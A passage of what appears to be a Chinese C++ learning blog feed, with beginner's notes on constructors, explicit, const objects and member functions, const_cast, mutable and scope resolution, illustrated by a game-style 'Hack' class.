        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>构造函数也是类的成员函数，但是比较特殊。<br>类一共有两个特殊的函数，一个是构造函数，另一个是析构函数。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Hack ha&#123;<span class="number">100</span>,<span class="number">200</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在成员变量都为public属性时，可以通过这种方式顺序初始化。</p><img src="/2022/06/23/Constructor/000.png" class=""><p>打印一下看到值是正确被赋予了。</p><p>但是如果有个成员是私有的，那么这种顺序就被打乱了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Hack ha&#123; <span class="number">100</span>,<span class="number">200</span> &#125;; <span class="comment">//error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1是不匹配，2是设置的参数超了。</p><p>归根结底就是类型没有对上，那么新建个类，然后给指定的参数赋值，在拷贝给这个类。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Hack ha;</span><br><span class="line">ha.hp = <span class="number">100</span>;</span><br><span class="line">Hack hc = ha;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方法是可行的，因为这样的拷贝就是只带上hp的值。</p><img src="/2022/06/23/Constructor/001.png" class=""><p>打印出来也是行得通，但是这个私有的mp是肯定没法操作。</p><hr><h2 id="setter和getter"><a href="#setter和getter" class="headerlink" title="setter和getter"></a>setter和getter</h2><p>其实接触c++面向对象的时候前面上学学过一点java的。<br>就有两种方法，一种是传参 初始化私有的成员变量，一种是返回这个私有变量的值。</p><p>手写也不难</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetMp</span><span class="params">(<span class="type">int</span> mp)</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;mp = mp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetMp</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> mp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/23/Constructor/002.png" class=""><p>的的确确是能够达到这种效果的。</p><hr><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>如果每次都要先创建一个被拷贝的类，还有疯狂调用set和get方法，显得很麻烦。</p><p>所以就要说一下这个特殊的构造函数。</p><ol><li>它属于成员函数在public:下</li><li>构造函数自动调用，且没有返回值</li><li>构造函数跟类同名</li><li>每个类至少有一个构造函数</li></ol><p>所以说很特殊，但是很高级~</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetMp</span><span class="params">(<span class="type">int</span> mp)</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;mp = mp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetMp</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> mp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Hack</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;构造函数&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">hp = <span class="number">100</span>;</span><br><span class="line">mp = <span class="number">200</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2022/06/23/Constructor/003.png" class=""><p>看到在实例化对象的时候和在打印参数值之前，肯定是调用了构造函数的，因为我们在构造函数里面也加了一条打印。</p><p>还有就是构造函数不止一个，说明它也可以重载</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Hack</span>(<span class="type">int</span> hp, <span class="type">int</span> mp)&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;hp = hp;</span><br><span class="line">    <span class="keyword">this</span>-&gt;mp = mp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>这里继续强调，形参名如果养成良好习惯就不要跟成员变量重复，除非你像我一样习惯用this指针去分开，否则就是一种无用行为，形参&#x3D;形参编译器都傻了</strong></p><p>为了区分也加个cout</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Hack</span>(<span class="type">int</span> hp, <span class="type">int</span> mp)&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;构造函数1&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">this</span>-&gt;hp = hp;</span><br><span class="line">    <span class="keyword">this</span>-&gt;mp = mp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/23/Constructor/004.png" class=""><p>可以看到效果很妙。</p><p>重载嘛，把类的对象当参数也ok，因为之前是用<code>=</code>号去赋值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Hack</span>(Hack&amp; H)&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;构造函数2&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">this</span>-&gt;hp = H.hp;</span><br><span class="line">    <span class="keyword">this</span>-&gt;mp = H.mp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/23/Constructor/005.png" class=""><hr><h2 id="默认构造函数"><a href="#默认构造函数" class="headerlink" title="默认构造函数"></a>默认构造函数</h2><p>这个就很好理解，就是你没有主动写，那么编译器自动给它加上一个<code>类名()&#123;&#125;</code><br>这个默认构造函数，无参数无返回值，就是空的放在那里。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> hp;</span><br><span class="line">    <span class="type">int</span> mp;</span><br><span class="line">    <span class="comment">//Box()&#123;&#125; 在没有定义构造函数的时候，默认存在的就是这样的。</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h2 id="default"><a href="#default" class="headerlink" title="default"></a>default</h2><p>前面说到只要定义过构造函数，就不会出现默认构造函数，但有的时候可能还需要一个默认构造函数<br>就可以用到default关键字去声明。</p><p><code>类名()&#123;&#125;</code> 默认构造函数<br><code>类名()=default;</code>用关键字定义默认构造函数</p><p>当我们注释掉之前写的构造函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*Hack()&#123;</span></span><br><span class="line"><span class="comment">    std::cout &lt;&lt; &quot;构造函数&quot; &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">    hp = 100;</span></span><br><span class="line"><span class="comment">    mp = 200;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br></pre></td></tr></table></figure><p>这个时候你再去创建一个类的对象就会报错了</p><img src="/2022/06/23/Constructor/006.png" class=""><p>解决的方法就是给它留个默认构造函数或者指定</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Hack</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Hack</span>() = <span class="keyword">default</span>;</span><br></pre></td></tr></table></figure><p>当然这两种方法只能存在一个，否则也是定义冲突。</p><p>这两种孰优孰劣要看默认构造函数里面是否要存放什么比如初始化，如果要就选前者，如果不需要就选后者。</p><hr><h2 id="explicit"><a href="#explicit" class="headerlink" title="explicit"></a>explicit</h2><blockquote><p>被explicit关键字修饰的构造函数会被禁止类型转换</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">toMax</span><span class="params">(Hack hack)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> hack.<span class="built_in">GetMp</span>() &gt; <span class="keyword">this</span>-&gt;mp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Hack</span>(<span class="type">int</span> mp)&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;mp = mp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/23/Constructor/007.png" class=""><p>布尔值，返回就是0或者1，这个很直观。</p><img src="/2022/06/23/Constructor/008.png" class=""><p>逻辑上也一点问题没有。</p><p>但是有个神奇的地方。</p><img src="/2022/06/23/Constructor/009.png" class=""><p>你会发现，我toMax函数明明参数是Hack类型的，居然放数字也成功了</p><p>其实本质上就是编译器偷偷转换了，因为我们有个构造函数就是让传值赋给mp的。<br>你在调用<code>std::cout &lt;&lt; ha.toMax(900) &lt;&lt; std::endl;</code><br>他就会先把这个900传进给一个临时的hack对象，然后再用这个临时的对象去和ha作比较。</p><p>那么说去掉这个构造函数就行，也确实是一个办法，但是有的时候我这个构造函数存在有他的道理，我只是不希望他被拿来做转换运算了。就可以使用explicit这个关键字</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">Hack</span><span class="params">(<span class="type">int</span> mp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;mp = mp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/23/Constructor/010.png" class=""><p>调用的地方就会发生报错了，无法转换。</p><p>这个在后面可以规避掉很多问题。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>未完结待续。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>const类</title>
      <link href="/2022/06/22/const/"/>
      <url>/2022/06/22/const/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>const肤浅的时候就是定义常量，跟<code>#define</code>类似。<br>但是当实例化的类被限定为const类型的时候，又是一个搞怪点</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Hack.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="type">int</span> lv;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;Hack.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">const</span> Hack hc;</span><br><span class="line">hc.hp = <span class="number">100</span>;    <span class="comment">//error</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为实例化的类被限定为了const，所以它也无法修改成员。</p><p>当然要修改一个const对象的时候，可以用指针+强转去逆它。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> Hack *HCP = &amp;hc;</span><br><span class="line">HCP-&gt;hp = <span class="number">100</span>;</span><br></pre></td></tr></table></figure><blockquote><p>这种方式仍然是不可取的，因为指针也被const修饰了，所以它也无法修改成员。<br>还好前面指针还有印象，知道怎么玩</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hack *HCP = (Hack*) &amp;hc;</span><br><span class="line">HCP-&gt;hp = <span class="number">100</span>;</span><br></pre></td></tr></table></figure><p>然后打印一下hc.hp发现的确被修改了</p><img src="/2022/06/22/const/000.png" class=""><p>当然这种方法有效，虽然还不知道有没有危害。</p><hr><h2 id="const的成员函数"><a href="#const的成员函数" class="headerlink" title="const的成员函数"></a>const的成员函数</h2><p>当const修饰过的类后，这个类同时也直接无法访问成员函数了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="type">int</span> lv;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> hp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2022/06/22/const/001.png" class=""><p>然后就有一种方式可以将函数也修饰成const类型。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="type">int</span> lv;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">test</span><span class="params">()</span> <span class="type">const</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> hp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后调用是能调用了，但是一看好像被优化成内联函数了</p><img src="/2022/06/22/const/002.png" class=""><p>感觉有点怪异，找了个正常实例化的类的对象访问看看。</p><img src="/2022/06/22/const/003.png" class=""><p>看到结果都是一样的内联的函数，想了想可能是因为函数是不像成员变量没生成一个就要重新划分内存，函数是可以放在代码区，等待调用的，而且这个函数正好也简单，被编译器优化了也有可能。毕竟内联就是替换简单的方法。</p><p><strong>而且不知道为啥，函数还必须是有返回值的，void类型的函数好像没有用</strong></p><blockquote><p>至于const为什么不加前面，那是因为前面代表返回值类型，const在前面，哪有返回一个什么const类型的值的道理。</p></blockquote><hr><p>所以const成员就不能被改变了，在这个规则下，const对象只能调用const函数。<br>且this指针会自适应成const，也就是说直接修改，或者在函数里修改，或者通过this指针修改均无法生效。</p><blockquote><p>骚操作可以…比如我上面那种强转指针哈哈，但是先基于逻辑上来讲是不能被修改的。</p></blockquote><hr><p>不过万一真的有需求要用const类。。。那么在一些常规的成员函数上就可能要尽量加上const，以保证const类对象能调用。</p><p>或者就是重载。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hack</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line"><span class="type">int</span> lv;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">test</span><span class="params">()</span> <span class="type">const</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> hp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> hp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2022/06/22/const/004.png" class=""><img src="/2022/06/22/const/005.png" class=""><p>可以看到const类对象和正常构造的对象所调用的test是不一样的。</p><p>然后就是不同方法写在不同的地方就行了。虽然在没用到之前很鸡肋，要重复copy代码。</p><hr><h2 id="指针强转"><a href="#指针强转" class="headerlink" title="指针强转"></a>指针强转</h2><p>然后就是之前说的通过强转指针改变</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Hack*)&amp;ha;</span><br></pre></td></tr></table></figure><p>这种方式是C语言风格的强转</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">const_cast</span>&lt;Hack*&gt;(&amp;ha);</span><br></pre></td></tr></table></figure><p>c++的风格。。额感觉可能还是习惯C语言风格的。</p><p>反正都是那个味，效果都一样，只是正常逻辑下不期望有另类修改途径。</p><hr><h2 id="mutable"><a href="#mutable" class="headerlink" title="mutable"></a>mutable</h2><p>被mutable修饰的成员变量可以被const成员函数修改~</p><p>这个就感觉稍微滑稽了一点，也就累加的时候玩玩</p><img src="/2022/06/22/const/006.png" class=""><p>当正常声明的成员变量，是肯定无法再const的函数下修改的。</p><p>但是加上mutable之后就行了。</p><img src="/2022/06/22/const/007.png" class=""><blockquote><p>表面上看着有点抽风，都让const成员无法修改了，还加个mutable玩<br>不过真到需要被修改的地方感觉也是debug的时候。</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>const类还挺鸡肋~</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>成员函数</title>
      <link href="/2022/06/22/member/"/>
      <url>/2022/06/22/member/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ROLE</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hp;             <span class="comment">//成员变量</span></span><br><span class="line"><span class="type">int</span> mp;             <span class="comment">//成员变量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Init</span><span class="params">()</span></span>&#123;        <span class="comment">//成员函数</span></span><br><span class="line">hpadd = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> hpadd;          <span class="comment">//成员变量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><span id="more"></span><blockquote><p>谁的成员，无非就是要知道作用域在哪里。</p></blockquote><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>与常规函数不同</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候函数add是全局函数，搁哪调用都没问题。<br>相反的，类中的成员函数，就只能被这个类调用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;hello Box\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello ::\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种时候在主函数中调用test()想都不用想调用的是外面的全局函数</p><img src="/2022/06/22/member/000.png" class=""><p><code>::</code>之前说过前面没有东西时就代表全局作用域，那么要调用Box的test就要<code>Box::test();</code><br>不过由于没有实例化，所以没意义，顶多在外面修改函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hello ::\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Box::test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hello ::Box\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">test</span>();</span><br><span class="line">Box b;</span><br><span class="line">b.<span class="built_in">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/22/member/001.png" class=""><p><strong>注意box类中的函数，定义要通过Box::写在外面的话，那么类中的函数只能是声明，否则会报错已有主体</strong><br>这里就是想在外面写，所以去掉了类中的函数主体。</p><hr><h2 id="成员函数的大小"><a href="#成员函数的大小" class="headerlink" title="成员函数的大小"></a>成员函数的大小</h2><p>可能这种写法刚从c风格过渡而来时会不习惯，但是一般类中的成员初始化或者函数定义都是写在外面的。</p><p>结构体的内存占用存在对齐情况，2 4 